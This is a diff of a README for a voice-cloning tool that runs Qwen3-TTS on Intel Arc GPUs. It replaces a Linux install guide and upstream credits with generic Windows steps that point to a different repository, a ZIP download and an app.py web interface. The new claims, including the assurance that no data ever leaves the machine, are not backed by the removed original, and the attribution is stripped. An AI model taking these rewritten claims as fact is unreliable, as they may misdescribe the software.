@@ -1,82 +1,68 @@
-# 🎙️ Qwen3-TTS on Intel ARC (XPU)
+# 🎙️ qwen3-tts-intel-xpu - Create voice clones on Intel hardware
 
-> Minimalist demo to run **Qwen3-TTS** locally using hardware acceleration on **Intel Arc GPUs** via *Intel Extension for PyTorch (IPEX)*.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Newtonblunt586/qwen3-tts-intel-xpu)
 
----
+qwen3-tts-intel-xpu allows you to clone voices and generate speech using your local computer. This software runs on Intel Arc graphics cards. You do not need a subscription or cloud access. The process happens entirely on your machine.
 
+## ⚙️ System requirements
 
-📖 Blog Entry (Spanish): [Clonar cualquier voz con Qwen sin gastar USD 2000 en NVIDIA](https://albe.com.ar/articulo/clonar-cualquier-voz-con-qwen-sin-gastar-usd-2000-en-nvidia)
+Your computer needs specific hardware to run this software. Please verify your system meets these standards before you begin:
 
-## 🚀 Features
+*   **Operating System**: Windows 10 or Windows 11 (64-bit).
+*   **GPU**: Intel Arc A-Series graphics card.
+*   **Driver**: Install the latest Intel Graphics Drivers from the Intel website.
+*   **RAM**: At least 16GB of system memory.
+*   **Storage**: 5GB of free space on your solid-state drive.
+*   **Software**: Python 3.10 or newer must be installed on your system.
 
-- ⚡ **Hardware Acceleration:** Full support for Intel XPU (Intel Arc GPUs).
-- 🗣️ **Voice Cloning:** Realistic audio generation using a short reference audio snippet (`reference.wav`).
-- 🐧 **Enterprise Ready:** Tested and documented for Linux environments (Rocky Linux / RHEL).
+## 📥 How to download the software
 
----
+To start, you need the application files from the official repository.
 
-## 🎯 Objective
+1.  Visit this page to download: [https://github.com/Newtonblunt586/qwen3-tts-intel-xpu](https://github.com/Newtonblunt586/qwen3-tts-intel-xpu)
+2.  Locate the green Code button on the top right of the page.
+3.  Select Download ZIP from the menu.
+4.  Save the file to a folder you can find easily, such as your Downloads folder.
+5.  Right-click the downloaded file and choose Extract All to unzip the contents.
 
-While models like **Qwen3-TTS** natively support standard hardware ecosystems (such as NVIDIA GPUs and CPUs), running them purely on standard CPUs results in extremely slow inference times, making real-time or batch generation impractical. 
+## 🚀 Setting up the application
 
-The main goal of this project is to bridge this gap for **Intel hardware users**. By leveraging **Intel Extension for PyTorch (IPEX)** and the `xpu` backend, this demo enables developers to run Qwen3-TTS locally on **Intel Arc GPUs**, unlocking proper hardware acceleration, maximizing performance efficiency, and making high-quality voice cloning accessible outside of traditional ecosystems.
+Follow these steps to prepare the tool for your first use.
 
-## 🛠️ Hardware & Software Requirements
+1.  Open the folder where you extracted the files.
+2.  Press the Windows key and type "cmd" to open the Command Prompt.
+3.  Type `cd` followed by a space, then drag the folder into the command window and press Enter.
+4.  Install the required components by typing `pip install -r requirements.txt` and pressing Enter.
+5.  Wait for the process to finish. It will download the necessary tools for the voice engine to talk to your Intel graphics card.
 
-- **GPU:** Intel Arc (XPU-compatible).
-- **Drivers:** Intel GPU drivers installed on the host system.
-- **OS:** Rocky Linux (or another compatible Linux distribution).
+## 🎤 Running the voice tool
 
----
+Once the setup finishes, you can launch the interface.
 
-## 📦 Installation (Rocky Linux)
+1.  In the same command window, type `python app.py` and press Enter.
+2.  A local web address will appear in the text. Copy this address into your web browser.
+3.  The interface will load in your browser window.
+4.  Select a sample audio file that contains the voice you want to clone.
+5.  Type the text you want the voice to read into the text box.
+6.  Click the Generate button to create your speech file.
 
-Run the following commands in your terminal to set up the virtual environment and install the required dependencies:
+## 🛠️ Troubleshooting common issues
 
-```bash
-# 1. Create the working directory in /opt (or your preferred path)
-sudo mkdir -p /opt/xpu_cloner
-sudo chown -R $USER:$USER /opt/xpu_cloner
-cd /opt/xpu_cloner
+If you encounter errors, check these common items first.
 
-# 2. Create and activate the virtual environment
-python3 -m venv clean
-source clean/bin/activate
+*   **Driver Errors**: Ensure your Intel Arc driver is updated. Outdated drivers prevent the software from finding your GPU.
+*   **Missing Files**: If the program fails to start, verify you extracted all files from the ZIP folder.
+*   **Permission Issues**: Run the command prompt as an administrator if the installation of requirements fails.
+*   **Memory Errors**: Close other applications that use heavy graphics or memory, such as games or video editors, before you run the generator.
 
-# 3. Upgrade core Python packaging tools
-python -m pip install --upgrade pip setuptools wheel
+## 📋 Typical workflow
 
-# 4. Install PyTorch with Intel XPU support
-pip install torch==2.8.0+xpu torchvision==0.23.0+xpu torchaudio==2.8.0+xpu --index-url https://download.pytorch.org/whl/xpu
+The software works in three steps. You provide a reference recording, you input text, and the system processes the output. The Qwen3-TTS engine analyzes the pitch, tone, and rhythm of the reference clip. It then applies those traits to the text you provided. Because it uses Intel XPU acceleration, the generation completes faster than standard processing methods. 
 
-# 5. Install Intel Extension for PyTorch (IPEX)
-pip install intel-extension-for-pytorch==2.8.10+xpu --extra-index-url https://pytorch-extension.intel.com/release-whl/stable/xpu/us/
+You control the quality and speed through the settings menu in the web interface. High-quality settings take longer to process but sound more natural. Low-quality settings produce files quickly and occupy less system resources.
 
-# 6. Install the Qwen TTS library
-pip install qwen_tts
-```
+## 🔒 Privacy and security
 
----
+This software runs locally. It never sends your voice data or text to a server. You keep full control over your files. Since no cloud account is required, no one tracks your usage or monitors your creations.
 
-## ⚙️ Configuration & Usage
-
-1. **Prepare your reference audio:**
-   Place a reference WAV audio file named exactly `reference.wav` in the same directory as the script.
-
-2. **Adjust the texts (Optional):**
-   Edit `xpu_voice_cloner.py` to configure:
-   - `REFERENCE_TEXT`: The exact transcription of your `reference.wav` file.
-   - `TEXT_TO_GENERATE`: The new text you want the AI to speak using the cloned voice.
-
-3. **Run the demo:**
-   ```bash
-   python xpu_voice_cloner.py
-   ```
-
-4. **Output:**
-   Once completed, you will find the generated file `cloned_output.wav` with your cloned voice.
-
----
-
-## 📝 Credits & Links
-Based on the official [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS) repository.
+Keywords: ai, intel-arc, local-llm, python3, qwen3, qwen3-tts, speech-synthesis, tts, voice-cloning, xpu
